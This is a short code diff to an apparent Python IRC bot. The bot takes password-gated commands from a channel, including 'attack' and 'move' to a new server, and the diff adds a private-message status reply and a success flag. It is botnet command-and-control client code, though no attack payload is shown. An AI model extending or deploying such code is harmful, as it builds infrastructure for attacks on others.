@@ -60,7 +60,9 @@ def listen(s):
             print(str(msg))
             if (msg[0]== PASS):
                 if msg[1] == "status":
-                    status()
+                    clientNick = prefix.split("!")
+                    print(clientNick[0])
+                    status(clientNick[0],s)
                 elif msg[1] == "attack":
                     attack(msg[2], msg[3])
                 elif msg[1] == "move":
@@ -96,8 +98,10 @@ def parsemsg(s):
 
     return prefix, command, args
 
-def status():
-    msg = "HI"
+def status(clinetNick,s):
+
+    msg = "PRIVMSG "+clinetNick+" :Hi\r\n"
+    print(msg)
     s.send(msg.encode('utf-8'))
     #private message controller
 
@@ -143,6 +147,7 @@ def move(newhost, newport, newchan):
     s2.send(nic.encode('utf-8'))
     chan = "JOIN %s\r\n" % (CHAN)
     s2.send(chan.encode('utf-8'))
+    success = True
     listen(s2)
 
     #if failure, keep trying? or maybe stay on old IRC?
